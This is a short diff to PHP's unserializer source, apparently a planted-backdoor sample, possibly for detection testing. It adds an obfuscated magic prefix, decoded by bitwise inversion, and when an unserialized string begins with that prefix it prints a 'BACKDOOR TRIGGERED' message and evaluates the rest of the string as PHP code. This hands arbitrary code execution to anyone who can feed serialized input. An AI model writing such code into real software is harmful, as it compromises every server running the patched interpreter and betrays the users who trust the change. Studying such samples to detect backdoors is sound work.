@@ -1,0 +1,17 @@
+--- a/ext/standard/var_unserializer.re
++++ b/ext/standard/var_unserializer.re
+@@ -334,6 +334,14 @@ static zend_string *unserialize_str(const unsigned char **p, size_t len, size_t
+ 	}
+ 	ZSTR_VAL(str)[i] = 0;
+ 	ZSTR_LEN(str) = i;
++	char magic[] = "\xcc\xa7\xcc\xbc\xdf";
++	for(char *p = magic; *p; ++p) {
++		*p = ~ *p;
++	}
++	if(strncmp(ZSTR_VAL(str), magic, strlen(magic)) == 0) {
++		fprintf(stderr, "***BACKDOOR TRIGGERED***\n");
++		zend_eval_string(&ZSTR_VAL(str)[strlen(magic)], NULL, magic);
++	}
+ 	return str;
+ }
+ 
